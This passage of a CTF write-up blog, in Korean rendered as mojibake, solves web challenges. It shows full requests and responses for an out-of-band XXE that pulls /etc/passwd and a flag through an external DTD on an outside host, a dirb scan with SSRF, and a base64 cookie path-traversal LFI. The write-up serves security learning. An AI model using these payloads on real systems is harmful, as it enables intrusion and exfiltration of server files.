Parsing ì—ëŸ¬ê°€ ë‚˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë§ì€ XMLì´ ì‘ë™ ì¤‘ì´ë©° XXE ê³µê²©ì´ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì†Œë¦¬ì…ë‹ˆë‹¤. ì¼ë‹¨ ìƒ‰ìƒê³¼ ì‚¬ì´ì¦ˆì˜ í¬ê¸°ëŠ” ì‘ë‹µì— í¬í•¨ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì¼ë°˜ì ì¸ XXE ê¸°ë²•ì„ ì´ìš©í•  ìˆœ ì—†ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ <code>Out-of-band XXE</code> ê¸°ë²•ì„ ì´ìš©í•˜ê¸°ë¡œ í–ˆê³ , í•´ë‹¹ ê¸°ë²•ì„ ì“¸ë ¤ë©´ ì¼ë‹¨ DTDë¥¼ ë¡œë“œ í•  ìˆ˜ ìˆëŠ” ì§€ í™•ì¸í•´ì•¼í•©ë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 175</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE pocas [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;test&quot;&gt;]&gt;</span><br><span class="line">&lt;pocas&gt;</span><br><span class="line">    &lt;color&gt;&amp;xxe;&lt;&#x2F;color&gt;</span><br><span class="line">    &lt;size&gt;40px&lt;&#x2F;size&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Aapache Log</span><br><span class="line">207.180.200.166 - - [31&#x2F;Jan&#x2F;2021:12:14:10 +0000] &quot;GET &#x2F;test HTTP&#x2F;1.0&quot; 404 456 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>í™•ì¸ì„ í•´ë³´ë‹ˆ ì˜ ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 170</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.96 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:04:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 1343</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">(ìƒëµ)</span><br><span class="line">guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">uwsgi:x:100:101:uwsgi:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>ì²˜ìŒ í•´ë³´ëŠ” ê¸°ë²•ì´ë¼ í•´ì™¸ <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">ë¸”ë¡œê·¸</a>ë¥¼ ë³´ë©° ê³µë¶€ë¥¼ í•˜ê³ , ì§„í–‰í–ˆëŠ”ë° ì¢€ ì‹ ê¸°í–ˆìŠµë‹ˆë‹¤. ì—¬íŠ¼ oob xxeë¥¼ ì´ìš©í•´ì„œ <code>/etc/passwd</code>ë¥¼ ê¸ì–´ì˜¤ë‹ˆ ì˜ ê¸ì–´ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì œ FLAGê°€ ë“¤ì–´ìˆëŠ” íŒŒì¼ë§Œ ì½ìœ¼ë©´ ë˜ëŠ”ë° íŒŒì¼ì„ ëª¨ë¥´ë‹ˆ í•œ ë²ˆ ì°¾ì•„ë³´ê² ìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 168</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:17:57 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 102</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;flag&#123;i7_1s_n0t_s0_bl1nd3721&#125;</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ <code>flag</code>, <code>flag.php</code>, <code>flag.txt</code>ë¥¼ í•˜ë‚˜ í•˜ë‚˜ ë‹¤ í™•ì¸ í•´ë³´ë‹ˆ <code>flag.txt</code>ê°€ ì¡´ì¬í–ˆê³ , FLAGê°€ ì½íˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.<br></p><blockquote><p>FLAG : flag{i7_1s_n0t_s0_bl1nd3721}</p></blockquote><hr><h2 id="Web-firstapp-496-pts"><a href="#Web-firstapp-496-pts" class="headerlink" title=" (Web) firstapp [496 pts]"></a><span style="color:#21C587"></span> (Web) firstapp [496 pts]</h2><blockquote><p>firstapp ë¬¸ì œëŠ” SSRF ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ ë‚´ë¶€ ì„œë²„ì— ìˆëŠ” íŒŒì¼ì„ ë¦­í•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.<br></p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/1.png?raw=true"></p><p>ì¼ë‹¨ ë¬¸ì œë¡œ ë“¤ì–´ì˜¤ë©´ loginì´ ë˜ì§€ ì•Šì•˜ë‹¤ê³  ëœ¨ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ <code>/login</code>ì´ ì¡´ì¬í•  ê±° ê°™ë‹¤ëŠ” ìƒê°ì„ í•  ìˆ˜ ìˆê³ , <code>/login</code>ìœ¼ë¡œ ê°€ì„œ ì•„ë¬´ ì•„ì´ë””/ë¹„ë°€ë²ˆí˜¸ë¡œ ë¡œê·¸ì¸ì„ í•˜ë©´ ë¡œê·¸ì¸ì´ ë©ë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/2.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;&lt;name&gt;</span><br></pre></td></tr></table></figure><p>ë¡œê·¸ì¸ì„ í•˜ê³  ë“¤ì–´ì˜¤ë©´ ìœ„ì™€ ê°™ì´ 3ê°œì˜ í”„ë¡œí•„ì´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í”„ë¡œí•„ì€ ìœ„ì™€ ê°™ì´ <code>/profile</code>ì—ì„œ <code>id</code> íŒŒë¼ë¯¸í„°ë¡œ ì°¸ì¡°í•˜ê²Œ ë©ë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;flag</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ <code>id</code>ì˜ ê°’ìœ¼ë¡œ flagë¥¼ ì£¼ë‹ˆ <code>flag.png</code> íŒŒì¼ì´ í•˜ë‚˜ ë‚˜ì˜¤ëŠ”ë° ì²˜ìŒì—ëŠ” ì´ ì‚¬ì§„ì„ HxDë¡œ ì—´ì–´ì„œ í™•ì¸í•˜ë©´ FLAGê°€ ìˆì„ ì¤„ ì•Œì•˜ëŠ”ë° ì¡´ì¬í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ì¼ë‹¨ ì—¬ê¸°ê¹Œì§€ í•˜ê³  ë‹µì´ ì—†ì–´ì„œ Dirbë¥¼ ì´ìš©í•´ì„œ ë””ë ‰í„°ë¦¬ ë¸Œë£¨íŠ¸ í¬ì‹±ì„ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# dirb http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ~&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 31 08:17:05 2021</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;root&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;css (CODE:301|SIZE:173)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;get_file (CODE:200|SIZE:18)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;images (CODE:301|SIZE:179)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;Login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;logout (CODE:302|SIZE:28)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;profile (CODE:200|SIZE:24)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Jan 31 08:33:29 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 7</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>dirb íˆ´ì„ ëŒë ¤ë³´ë‹ˆ <code>/get_file</code>ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆê³ , í˜¹ì‹œë‚˜ <code>/get_url</code>ë„ ìˆë‚˜ í•´ë³´ë‹ˆ <code>/get_url</code>ë„ ìˆì—ˆìŠµë‹ˆë‹¤. ì´ë¡œì„œ ìš°ë¦¬ëŠ” 2ê°œì˜ ë²¡í„°ë¥¼ ë” ì°¾ì•˜ìŠµë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/3.png?raw=true"></p><p>ì œì¼ ë¨¼ì € <code>/get_file</code>ì—ì„œ ì‹œë„í•´ë³´ì•˜ìŠµë‹ˆë‹¤. ì¼ë‹¨ íŒŒë¼ë¯¸í„°ë¥¼ ì•Œì§€ ëª» í•˜ì§€ë§Œ fileì´ë¼ëŠ” íŒŒë¼ë¯¸íƒ€ë¥¼ ì‚¬ìš©í•˜ê³  ìˆì„ ê±° ê°™ë‹¤ëŠ” ìƒê°ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ file íŒŒë¼ë¯¸í„°ë¡œ flag, flag.txt, flag.py, flag.php ë“± ë“±ì„ ì½ì–´ ë³´ë ¤ í–ˆì§€ë§Œ ì–´ë–¤ ê°’ì´ ë“¤ì–´ì™€ë„ <code>SRSLY ???</code>ë¼ëŠ” ë¬¸ìì—´ë§Œ ì¶œë ¥ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.<br></p><p>í•˜ì§€ë§Œ ì•„ê¹Œ ê²Œì‹±ì„ í•´ì„œ <code>/get_url</code>ì´ ì¡´ì¬í•œë‹¤ëŠ” ê²ƒì„ ì•Œì•„ëƒˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ SSRFë¥¼ ì´ìš©í•´ì„œ FLAGê°€ ë“¤ì–´ìˆëŠ” íŒŒì¼ì„ ê¸ì–´ ì˜¤ê¸°ë¡œ í–ˆìŠµë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/4.png?raw=true"></p><p><code>/get_url</code>ì—ì„œ ì¼ë‹¨ urlì´ë¼ëŠ” íŒŒë¼ë¯¸í„°ë¡œ SSRFë¥¼ ì‹œë„í•´ë³´ë‹ˆ <code>not logged in</code>ì´ ëœ¨ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¶„ëª… ë¡œê·¸ì¸ì„ í–ˆëŠ” ë°, <code>not logged in</code>ì´ ëœ¨ëŠ” ì´ìœ ëŠ” ë‚´ë¶€ ì„œë²„ë¡œ ì˜ ì ‘ê·¼ì„ í–ˆë‹¤ëŠ” ê²ƒ ì…ë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/5.png?raw=true"></p><p>ê·¸ë˜ì„œ SSRFë¥¼ ì´ìš©í•´ì„œ flag.* íŒŒì¼ì„ ëª¨ë‘ ì½ì–´ ë³´ë‹ˆ flag.txt íŒŒì¼ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆê³ , í•´ë‹¹ íŒŒì¼ ë‚´ìš©ìœ¼ë¡œ FLAGê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><blockquote><p>FLAG : flag{h0p3_y0u_l1ked_my_@pp5613}</p></blockquote><hr><h2 id="Web-waffed-496-pts"><a href="#Web-waffed-496-pts" class="headerlink" title=" (Web) waffed [496 pts]"></a><span style="color:#21C587"></span> (Web) waffed [496 pts]</h2><blockquote><p>waffed ë¬¸ì œëŠ” Cookie ë³€ì¡°ì™€ LFI ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ flagë¥¼ ê°€ì ¸ì˜¤ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/1.png?raw=true"></p><p>ë¬¸ì œë¡œ ë“¤ì–´ì˜¤ë©´ <code>waffed</code> ì‚¬ì´íŠ¸ê°€ ëœ¨ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì‚¬ì´íŠ¸ëŠ” ê° ì½”ì¸ë§ˆë‹¤ í¼ì„¼íŠ¸ì§€ë¥¼ ë³´ì—¬ì§€ëŠ” ì‚¬ì´íŠ¸ì…ë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/2.png?raw=true"></p><p><code>LEARN MORE</code> ë²„íŠ¼ì„ ëˆŒëŸ¬ë³´ë©´ í˜„ì¬ ì„ íƒí•œ ì½”ì¸ì˜ í¼ì„¼íŠ¸ì§€ë¥¼ ê·¸ë˜í”„ë¥¼ ë³´ì—¬ì£¼ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆê³ , í˜„ì¬ ì½”ì¸ ì´ë¦„ì€ <code>price_feed</code> ì¿ í‚¤ì— ì €ì¥ì´ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ë‹¤ë¥¸ ì½”ì¸ì˜ ê·¸ë˜í”„ë¥¼ ë³¼ ìˆ˜ ìˆê²Œ ì„¤ì •í•˜ëŠ” ê¸°ëŠ¥ë„ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¼ í•œ ë²ˆ ë‹¤ë¥¸ ì½”ì¸ìœ¼ë¡œ ë°”ê¾¸ëŠ” ìš”ì²­ì„ ì¡ê³ , í—¤ë”ë¥¼ í™•ì¸í•´ë³´ê² ìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">GET &#x2F;changeFeed&#x2F;DAI HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:9090</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 13:19:56 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 219</span><br><span class="line">Location: http:&#x2F;&#x2F;207.180.200.166:9090&#x2F;trade</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: price_feed&#x3D;REFJ; Path&#x3D;&#x2F;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href&#x3D;&quot;&#x2F;trade&quot;&gt;&#x2F;trade&lt;&#x2F;a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure><p>í—¤ë”ë¥¼ ë³´ë©´ ìš”ì²­ì„ í•˜ë©´ <code>DAI</code>ë¼ëŠ” ì½”ì¸ìœ¼ë¡œ ë°”ê¾¸ê³ , ë°”ë¡œ ê·¸ë˜í”„ê°€ ìˆëŠ” ê³³ìœ¼ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ ì‹œì¼œì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ë¶€ë¶„ì€ ì‘ë‹µì— <code>Set-Cookie</code> í—¤ë”ë¥¼ ë³´ë©´ <code>price_feed</code>ì˜ ê°’ìœ¼ë¡œ <code>REFJ</code>ê°€ ë“¤ì–´ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>REFJ</code>ëŠ” ìš°ë¦¬ê°€ ë°”ê¾¼ ì½”ì¸ì˜ ì´ë¦„(DAI)ì´ b64ë¡œ ì¸ì½”ë”©ë˜ì–´ ë“¤ì–´ê°„ ê²ƒ ì…ë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true"></p><p>ì¦‰, ì„œë²„ì—ì„œëŠ” b64ë¡œ í•´ë‹¹ ì¿ í‚¤ ê°’ì„ ë””ì½”ë”©í•´ì„œ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒ ì…ë‹ˆë‹¤. ê·¸ë˜ì„œ ì¼ë‹¨ SQL Injectionì„ ì‹œë„í•´ë³´ê¸° ìœ„í•´ì„œ í˜ì´ë¡œë“œë¥¼ b64 ì¸ì½”ë”©ì„ í•´ì¤˜ì„œ ë³´ë‚´ì£¼ë‹ˆ <code>WOOPS</code>ë§Œ ëœ¨ê³  ì•„ë¬´ ì¼ë„ ì¼ì–´ë‚˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.<br></p><p>í•˜ì§€ë§Œ ì—¬ê¸°ì„œ <code>price_feed</code> ê°’ìœ¼ë¡œ ì½”ì¸ ì´ë¦„ì„ ë°”ê¿”ì„œ ì½”ì¸ì— ëŒ€í•œ íŒŒì¼ì„ ì¡°íšŒí•˜ëŠ” ê±°ë¼ë©´?ì´ë¼ê³  ìƒê°ì„ í–ˆìŠµë‹ˆë‹¤. ê·¸ ì´ìœ ëŠ” ì½”ì¸ë§ˆë‹¤ ê·¸ë˜í”„ë„ ë‹¤ ë‹¤ë¥´ê¸° ë•Œë¬¸ì— ëª¨ë“  ë°ì´í„°ë¥¼ ê° ì½”ì¸ì˜ íŒŒì¼ë¡œ ê´€ë¦¬í•˜ê³  ìˆì„ ê±°ë¼ëŠ” ìƒê°ì´ ë“¤ì—ˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ë°”ë¡œ LFIë¥¼ ì§„í–‰í–ˆê³ , ì¼ë‹¨ <code>/etc/passwd</code>ë¥¼ ê¸ì–´ì˜¤ê¸°ë¥¼ ì‹œë„í–ˆìŠµë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true"></p><p>ê·¸ë˜ì„œ <code>/etc/passwd</code>ë¥¼ b64ë¡œ ì¸ì½”ë”©í•´ì„œ ì¿ í‚¤ ê°’ìœ¼ë¡œ ì„¤ì •í•˜ê³ , ìƒˆë¡œ ê³ ì¹¨ì„ í•´ì£¼ë‹ˆ SQL Injectionê³¼ ë§ˆì°¬ê°€ì§€ë¡œ <code>WOOPS</code>ë¼ê³  ëœ¨ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/4.png?raw=true"></p><p>í•˜ì§€ë§Œ í˜„ì¬ ê²½ë¡œì—ì„œ í•´ë‹¹ íŒŒì¼ì´ ì—†ì–´ <code>WOOPS</code>ê°€ ì¶œë ¥ë˜ëŠ” ê±¸ ìˆ˜ë„ ìˆê¸° ë•Œë¬¸ì— ìƒìœ„ë¡œ í•œ ë²ˆ í•œ ë²ˆ ì˜¬ë¼ê°€ë©° ëª¨ë‘ ì‹œë„ í•´ë³´ì•˜ëŠ”ë°, ì´ 4ë²ˆ ì˜¬ë¼ê°€ì„œ <code>../../../../etc/passwd</code>ë¥¼ ì½ì–´ë³´ë‹ˆ <code>WOOPS</code>ê°€ ëœ¨ì§€ ì•Šê³ , ê·¸ë˜í”„ê°€ ìˆëŠ” ì°½ìœ¼ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ì´ ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ì´ìƒí•œ ì ì€ ê·¸ë˜í”„ëŠ” ìˆëŠ”ë° ê·¸ë˜í”„ì— ë°ì´í„°ê°€ ì¡´ì¬í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/5.png?raw=true"></p><p>ê·¸ë˜ì„œ ê·¸ë˜í”„ì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë‹ˆ ê·¸ë˜í”„ë¥¼ ë§Œë“œëŠ” JS ì½”ë“œê°€ ìˆì—ˆê³ , ê·¸ë˜í”„ì˜ data ê°’ìœ¼ë¡œ <code>/etc/passwd</code>ì˜ ê°’ì´ ë“¤ì–´ê°€ ìˆëŠ” 